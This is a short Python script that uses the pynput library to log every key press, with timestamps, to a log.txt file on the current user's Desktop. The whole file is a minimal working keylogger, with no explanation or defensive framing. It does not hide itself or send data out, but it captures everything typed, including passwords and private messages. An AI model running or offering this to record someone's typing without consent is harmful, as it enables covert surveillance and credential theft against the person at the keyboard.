import os
import logging
from pynput.keyboard import Listener

username = os.getlogin()

logging_directory = f'/home/{username}/Desktop'
logging.basicConfig(filename=f'{logging_directory}/log.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')


def key_handler(key):
    logging.info(key)


with Listener(on_press=key_handler) as listener:
    listener.join()
